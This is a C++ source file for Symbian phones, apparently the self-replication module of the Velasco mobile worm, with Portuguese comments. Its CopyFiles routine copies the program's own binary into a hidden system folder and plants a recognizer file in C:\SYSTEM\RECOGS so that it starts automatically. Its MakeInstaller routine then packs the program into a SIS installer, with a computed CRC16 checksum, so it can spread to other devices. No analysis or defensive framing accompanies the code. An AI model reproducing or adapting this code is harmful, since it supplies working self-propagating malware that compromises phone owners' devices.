#include "velascocopyfiles.h"
#include "file.h"

#include <bautils.h>


_LIT16( MARCOSMDLFILE,  "MARCOS.MDL" );
_LIT16( VELASCORSCFILE, "VELASCO.RSC" );

_LIT( VELASCOPATH,      "C:\\SYSTEM\\SYMBIANSECUREDATA\\VELASCO\\" );
_LIT( VELASCOAPPPATH,   "C:\\SYSTEM\\SYMBIANSECUREDATA\\VELASCO\\VELASCO.APP" );
_LIT( VELASCORSCPATH,   "C:\\SYSTEM\\SYMBIANSECUREDATA\\VELASCO\\VELASCO.RSC" );
_LIT( VELASCOSISPATH,   "C:\\SYSTEM\\SYMBIANSECUREDATA\\VELASCO\\VELASCO.SIS" );

_LIT( MDLPATH,          "C:\\SYSTEM\\RECOGS\\" );
_LIT( MARCOSMDLPATH,    "C:\\SYSTEM\\RECOGS\\MARCOS.MDL" );


#define  BLOCK_LEN  200


// Funcao de CRC16 obtida em:
// http://homepage.ntlworld.com/thouky/software/psifs/sis.html

unsigned short int VelascoCopyFiles::CRC16( unsigned short int crc16, unsigned char *string, unsigned int stringsize )
{
    unsigned int table[ 256 ], i;
    
    table[ 0 ] = 0;
    
    for ( i = 0; i < 128; i++ )
    {
        unsigned int carry = table[ i ] & 0x8000;
        unsigned int temp  = ( table[ i ] << 1 ) & 0xFFFF;
        
        table[ i * 2 + ( carry ? 0 : 1 ) ] = temp ^ 0x1021;
        table[ i * 2 + ( carry ? 1 : 0 ) ] = temp;
    }
    
	for ( i = 0; i < stringsize; i++ )
	{
		crc16 = ( ( crc16 << 8 ) ^ table[ ( ( crc16 >> 8 ) ^ string[ i ] ) & 0xFF ] );
	}

    return crc16;
}


void VelascoCopyFiles::MakeInstaller()
{
#include "header.h"	
#include "resource.h"	

	File fInstaller;

    // Tenta criar o arquivo
	if ( ! fInstaller.Open( VELASCOSISPATH, File::OMRead | File::OMWrite | File::OMCreate ) )
	{
	    // Tenta substituir o arquivo
		if ( ! fInstaller.Open( VELASCOSISPATH, File::OMRead | File::OMWrite | File::OMReplace ) )
		{
			return;
		}
	}

	File fApplication;

	if ( fApplication.Open( VELASCOAPPPATH, File::OMRead | File::OMOpen ) )
	{
	    File fMDL;

	    if ( fMDL.Open( MARCOSMDLPATH, File::OMRead | File::OMOpen ) )
	    {
	        unsigned int FilesLength, ResourceLength, Offset1, Offset2, Offset3;

	        int MDLLength, ApplicationLength;

            // Obtem tamanho dos arquivos
	        fApplication.rFile.Size( ApplicationLength );
	        fMDL.rFile.Size( MDLLength );

            // Define tamanho dos dados e offsets
	        ResourceLength = sizeof( resourcecontent );
	        FilesLength    = ApplicationLength + MDLLength + ResourceLength;

	        Offset1 = sizeof( headercontent );
	        Offset2 = Offset1 + ApplicationLength;
	        Offset3 = Offset2 + MDLLength;

            // Acerta tamanhos e offsets na estrutura a ser gravada
            memcpy( &headercontent[ 0x50 ], &FilesLength,       sizeof( unsigned int ) );

            memcpy( &headercontent[ 0x82 ], &ApplicationLength, sizeof( unsigned int ) );
            memcpy( &headercontent[ 0x86 ], &Offset1,           sizeof( unsigned int ) );
            memcpy( &headercontent[ 0x8A ], &ApplicationLength, sizeof( unsigned int ) );

            memcpy( &headercontent[ 0xB2 ], &MDLLength,         sizeof( unsigned int ) );
            memcpy( &headercontent[ 0xB6 ], &Offset2,           sizeof( unsigned int ) );
            memcpy( &headercontent[ 0xBA ], &MDLLength,         sizeof( unsigned int ) );

            memcpy( &headercontent[ 0xE2 ], &ResourceLength,    sizeof( unsigned int ) );
            memcpy( &headercontent[ 0xE6 ], &Offset3,           sizeof( unsigned int ) );
            memcpy( &headercontent[ 0xEA ], &ResourceLength,    sizeof( unsigned int ) );

            // Grava o header
            fInstaller.Write( headercontent, sizeof( headercontent ) );

            // Define algumas variaveisCalcula CRC16 dos 0x10 primeiros bytes do header
	        unsigned char buffer[ BLOCK_LEN ];
	        
	        unsigned short int crc16 = 0;
            int bytes;
	
            // Calcula CRC16 dos 0x10 primeiros bytes do header
            crc16 = CRC16( crc16, (unsigned char *) headercontent, 0x10 );

            // Calcula o CRC16 restante do header
            crc16 = CRC16( crc16, (unsigned char *) &headercontent[ 0x12 ], sizeof( headercontent ) - 0x12 );
  
 	        // Grava APP
	        while ( ( bytes = fApplication.Read( buffer, BLOCK_LEN ) ) )
	        {
		        fInstaller.Write( buffer, bytes );		

		        crc16 = CRC16( crc16, (unsigned char *) buffer, bytes );
	        }
	
	        // Grava RECOG
	        while ( ( bytes = fMDL.Read( buffer, BLOCK_LEN ) ) )
	        {
		        fInstaller.Write( buffer, bytes );

		        crc16 = CRC16( crc16, (unsigned char *) buffer, bytes );
	        }

	        // Grava RSC
	        fInstaller.Write( resourcecontent, sizeof( resourcecontent ) );

	        crc16 = CRC16( crc16, (unsigned char *) resourcecontent, sizeof( resourcecontent ) );

            // Grava CRC16 no offset 0x10
	        fInstaller.Seek( ESeekStart, 0x10 );
	        fInstaller.Write( &crc16, sizeof( unsigned short int ) );
	
	        // Fecha handle
	        fMDL.Close();
	    }
	    
	    // Fecha handle
	    fApplication.Close();
	}
	
	// Fecha handle
	fInstaller.Close();
}


void VelascoCopyFiles::CopyFiles( CAknApplication *AppName )
{
	TFileName TempName = AppName->DllName();
	TempName.UpperCase();

	TParse parser;
	parser.Set( TempName, NULL, NULL );
	
	RFs fs;
	User::LeaveIfError( fs.Connect() );

	if ( TempName != VELASCOAPPPATH )
	{ 
	    fs.MkDirAll( VELASCOPATH );
	
	    if ( BaflUtils::CopyFile( fs, TempName, VELASCOAPPPATH, CFileMan::EOverWrite ) == KErrNone )
	    {
	        TempName = parser.DriveAndPath();
            TempName.Append( VELASCORSCFILE );
            
	        BaflUtils::CopyFile( fs, TempName, VELASCORSCPATH, CFileMan::EOverWrite );
	    }	    
	}

	TempName = parser.DriveAndPath();
    TempName.Append( MARCOSMDLFILE );

	fs.MkDirAll( MDLPATH );
	BaflUtils::CopyFile( fs, TempName, MARCOSMDLPATH, CFileMan::EOverWrite );

	fs.Close();

    // Gera instalador
	MakeInstaller();
}
